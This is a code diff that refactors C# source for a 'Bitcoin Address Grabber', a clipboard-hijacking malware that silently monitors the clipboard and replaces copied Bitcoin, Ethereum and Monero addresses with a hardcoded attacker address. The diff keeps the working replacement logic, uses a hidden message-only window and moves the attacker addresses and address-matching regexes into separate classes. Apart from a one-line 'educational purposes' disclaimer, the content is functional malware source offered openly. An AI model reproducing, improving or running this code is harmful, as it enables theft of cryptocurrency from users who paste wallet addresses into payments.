@@ -6,7 +6,7 @@ using System.Text.RegularExpressions;
 
 /*
  * │ Author       : NYAN CAT
- * │ Name         : Bitcoin Address Grabber v0.3
+ * │ Name         : Bitcoin Address Grabber v0.3.5
  * │ Contact      : https:github.com/NYAN-x-CAT
  * 
  * This program Is distributed for educational purposes only.
@@ -18,15 +18,32 @@ namespace Bitcoin_Grabber
     {
         public static void Main()
         {
-            new Thread(() => { Application.Run(new ClipboardNotification.NotificationForm()); }).Start();
+            new Thread(() => { Run(); }).Start();
         }
+
+        public static void Run()
+        {
+            Application.Run(new ClipboardNotification.NotificationForm());
+        }
+    }
+
+    internal static class Addresses
+    {
+        public readonly static string btc = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"; //attacker's btc address
+        public readonly static string ethereum = "Ethereum"; //attacker's eth address
+        public readonly static string xmr = "XMR"; //attacker's xmr address
+    }
+
+    internal static class PatternRegex
+    {
+        public readonly static Regex btc = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b");
+        public readonly static Regex ethereum = new Regex(@"\b0x[a-fA-F0-9]{40}\b");
+        public readonly static Regex xmr = new Regex(@"\b4([0-9]|[A-B])(.){93}\b");
     }
 
     internal static class NativeMethods
     {
-        //https://stackoverflow.com/questions/17762037/error-while-trying-to-copy-string-to-clipboard
-        //https://gist.github.com/glombard/7986317
-
+        //stackoverflow.com/questions/17762037/error-while-trying-to-copy-string-to-clipboard
         public const int WM_CLIPBOARDUPDATE = 0x031D;
         public static IntPtr HWND_MESSAGE = new IntPtr(-3);
 
@@ -38,7 +55,7 @@ namespace Bitcoin_Grabber
         public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
     }
 
-    public static class Clipboard
+    internal static class Clipboard
     {
         public static string GetText()
         {
@@ -72,42 +89,44 @@ namespace Bitcoin_Grabber
     {
         public class NotificationForm : Form
         {
+            private static string currentClipboard = Clipboard.GetText();
             public NotificationForm()
             {
                 NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                 NativeMethods.AddClipboardFormatListener(Handle);
             }
 
+            private bool RegexResult(Regex pattern)
+            {
+                if (pattern.Match(currentClipboard).Success) return true;
+                else
+                    return false;
+            }
+
             protected override void WndProc(ref Message m)
             {
                 if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                 {
-                    string currentClipboard = Clipboard.GetText();
+                    currentClipboard = Clipboard.GetText();
 
-                    string btcReplacement = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"; //attacker's btc address
-                    Regex btcPattern = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"); //btc
-
-                    string ethereumReplacement = "Ethereum"; //attacker's eth address
-                    Regex ethereumPattern = new Regex(@"\b0x[a-fA-F0-9]{40}\b"); //ethereum
-
-                    string xmrReplacement = "XMR"; //attacker's xmr address
-                    Regex xmrPattern = new Regex(@"\b4([0-9]|[A-B])(.){93}\b"); //xmr
-
-                    if (btcPattern.Match(currentClipboard).Success && !currentClipboard.Contains(btcReplacement))
+                    if (RegexResult(PatternRegex.btc) && !currentClipboard.Contains(Addresses.btc))
                     {
-                        string result = btcPattern.Replace(currentClipboard, btcReplacement);
+                        string result = PatternRegex.btc.Replace(currentClipboard, Addresses.btc);
                         Clipboard.SetText(result);
                     }
-                    if (ethereumPattern.Match(currentClipboard).Success && !currentClipboard.Contains(ethereumReplacement))
+
+                    if (RegexResult(PatternRegex.ethereum) && !currentClipboard.Contains(Addresses.ethereum))
                     {
-                        string result = ethereumPattern.Replace(currentClipboard, ethereumReplacement);
+                        string result = PatternRegex.ethereum.Replace(currentClipboard, Addresses.ethereum);
                         Clipboard.SetText(result);
                     }
-                    if (xmrPattern.Match(currentClipboard).Success && !currentClipboard.Contains(xmrReplacement))
+
+                    if (RegexResult(PatternRegex.xmr) && !currentClipboard.Contains(Addresses.xmr))
                     {
-                        string result = xmrPattern.Replace(currentClipboard, xmrReplacement);
+                        string result = PatternRegex.xmr.Replace(currentClipboard, Addresses.xmr);
                         Clipboard.SetText(result);
                     }
+
                 }
                 base.WndProc(ref m);
             }
